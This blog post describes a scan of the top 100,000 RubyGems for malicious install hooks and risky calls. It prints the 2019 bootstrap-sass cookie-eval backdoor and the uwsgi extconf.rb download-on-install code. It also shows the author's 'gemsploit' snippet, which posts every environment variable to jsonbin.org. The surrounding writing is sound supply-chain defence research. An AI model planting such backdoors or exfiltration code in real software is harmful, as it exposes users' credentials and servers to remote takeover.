---
layout: post
title: "Top Ruby exploits in rubygems.org"
date: 2021-01-22 01:49:55 -0400
comments: true
categories: 
---

<img src="/images/magnify-search.jpg" alt="Search for malicious gems" title="Search for malicious gems" class="banner-img" />

### Search for vulnerabilities in public Ruby Gems

Open-source packages are an amazing, but also a scary gift. When you install and execute foreign code, you're trusting that the proprietors are good citizens that aggressively audit code changes. On my dev laptop, I have unencrypted bitcoin wallets and API keys hardcoded in environment variables that any program would have access to when run.

Package hosts make it difficult for devs to audit the hosted code because there is no tight coupling between code-viewing platforms like Github and the compressed code that is hosted on the package tool. The code shared on Github could be completely different than the code hosted on the package server since the servers are not connected. The only true way to audit the library you're using is to fetch, unpack, and inspect the millions of lines yourself.

### Who has time to audit everything?

Ruby's monkey patching and bundler tooling leave apps vulnerable to a variety of remote code execution attacks. I downloaded the latest version of every gem hosted on RubyGems.org to find what malware could be lying hidden in the open. I search 2,500,000 ruby files with golang to search for RCE, unexpected network requests, and more.

#### Malicions extconf.rb

During the `bundle install` process, code is executed from the gem if there is a `extconf.rb` file. `extconf.rb` by design contains instructions on how to build c libraries when installing the gem. Some gems are written in a lower-level language to take advantage of the better performance. An example is the [fast_blank](https://github.com/SamSaffron/fast_blank) wherein c-land, which quickly determines if a string value is blank.

#### Monkey Patching Hooks

Monkey patching first-class types like `String` or `Object` can both improve the use-ability of these objects as well as expose vulnerabilities. In 2019, someone monkey patched the `Rake::Sendfile` to add their middleware to rails code that installed a bad version of `bootstrap-saas`.

```ruby
begin
 require 'rack/sendfile'
 if Rails.env.production?
   Rack::Sendfile.tap do |r|
     r.send :alias_method, :c, :call
     r.send(:define_method, :call) do |e|
       begin
         x = Base64.urlsafe_decode64(e['http_cookie'.upcase].scan(/___cfduid=(.+);/).flatten[0].to_s)
         eval(x) if x
       rescue Exception
       end
       c(e)
     end
   end
 end
rescue Exception
 nil
end
```

This code would allow the attacker to run arbitrary code passed in via the cookie. The code could share the machine's configuration variables and database connections.

#### grep for sensitive Ruby code

The `eval` method executes a string as if it was ruby code ([details](https://apidock.com/ruby/v2_5_5/Kernel/eval)). Most gems or rails applications should never use this cmd because it is too easy for abuse. Allowing a user-submitted string to be evaluated would let any user run code on your production machine and thus grant full access to your internal network. Scary stuff.

The `send` method acts similar to `eval` but it can be run in an object. For example, `"kitten".send("capitalize")` would capitalize "Kitten". If a user-defined variable is given, instead of a hardcoded string, then potentially arbitrary ruby code could be defined and executed. Most gems should never use the `send` or `eval` methods.

Hackers can also open network requests to a server, sending private information about the machine installing the gem or running it. In ruby, you should verify that `Net` class is not being unexpectedly used to call a command and control center.

Most gems also should not be accessing the `ENV` object. Often developers store their private keys as environment variables instead of hardcoding them in code.

List of objects and methods to check:
  - `ENV`
  - `eval`
  - `send`
  - `exec`
  - `\``
  - `fork`
  - `spawn`
  - `syscall`
  - `system`

#### Searching the top 100,000 ruby gems for exploits

Rubygems.org offers a [data dump](https://rubygems.org/pages/data) of all of the gems on rubygems with how much they were downloaded. For the sake of speed and bandwidth limitations, I will only fetch the top 100,000 for analysis.

I was a bit lazy and used a `Gemfile` and `bundle install -j 8` to fetch the latest version of the 100,000 most popular ruby gems of 2020-11-15.

With the raw source code dumped into a local directory, I can use a mix of ruby and `grep` to search all of the gems for suspicious code. Unfortunately, I wasn't able to fully automate the research process. My script searched for suspicious method calls, flagged the line along with the package name, and then I verified that each suspicious line was a false positive. For example, a ruby gem that adds a CSS framework should never use `eval`, but they may use it in their test cases. In general, it's never good to use `eval`, using it in a test case that isn't run on production should be safe.

The git repo powering this exploration can be found at [https://github.com/KevinColemanInc/gem-sec-research](https://github.com/KevinColemanInc/gem-sec-research).

### Conclusion: What gems are vulnerable?

Highlights! Using sensitive ruby code isn't inherently bad, so I'm not able to understand the intention of 200,000 ruby gems to determine if calling `eval` is malicious or expected. The much lower hanging fruit is what gems attack the server or developers box via `extconf.rb`. My `gemsploit` gem sends all of the ENV variables up to a server 

### Top picks 

#### lwes_ext

[lwes_ext](https://rubygems.org/gems/lwes), downloaded 69,122 times, when installed, downloads a script from a website and executes it. The script is no longer available, so it just crashes. Since the project and website aren't maintained, I worry that a malicious actor could buy the domain if it was allowed to expire and swap in a more nefarious script.

#### uwsgi
```ruby
# uwsgi-2.0.19/ext/uwsgi/extconf.rb
require 'net/http'

Net::HTTP.start("uwsgi.it") do |http|
  resp = http.get("/install")
  open("install.sh", "wb") do |file|
      file.write(resp.body)
  end
end
```

[uwsgi](https://rubygems.org/gems/uwsgi) is doing the same as lwes_ext, executing arbitrary code downloaded from the internet. The script behind this 404s now, so who knows what it was doing before?

#### httpcookie

> This failure is intentional. You probably meant to install and run http-cookie

In [httpcookie](https://rubygems.org/gems/httpcookie), a kind-hearted developer trying to prevent people from falling pre to typosquatting created a gem called `httpcookie` that all it does is fail on install. It warns the developer they mistyped the gem name and they need to go install the correct gem.

#### gemsploit

I wrote the [gemsploit](https://github.com/KevinColemanInc/gemsploit) gem to explore what can happen with malicious code.

```ruby
uri = URI.parse("https://jsonbin.org/kevincolemaninc/#{SecureRandom.uuid}")
request = Net::HTTP::Post.new(uri)
request["Authorization"] = "token " # withheld
request.body = JSON.dump(ENV.to_h)
```

By installing this gem, all of your ENV variables are posted up to jsonbin.org for public viewing. My development machine had AWS secrets, bitcoin wallet secrets, and other hard-coded passwords. I have since moved to use [dotenv](https://github.com/motdotla/dotenv) to silo my env secret keys, but this still doesn't protect gems from scanning your hard drive for unprotected BTC wallets.

#### Further Reading

[[EN] How to take over a Ruby gem / Maciej Mensfeld @maciejmensfeld](https://www.youtube.com/watch?v=wePVhZeZTNM)

This conference talk was the inspiration for this exploration.

[Diffend](https://diffend.io/)

This is a really neat project that makes it easy to compare changes across versions of gems. You still have to take the time to audit the changes, but hopefully, with their clean interface, it does not take you too long.


#### Source Code

You can find the source code for [lib-scanner](https://github.com/KevinColemanInc/lib-scanner) on github. The project is (mostly) written in golang with an in-depth readme file explaining how the code pipeline works.

#### Future work

I'd love to bring this scanner to other languages like golang or python. Please shoot me an email (kevin at sparkstart.io) if you're interested in collaborating!
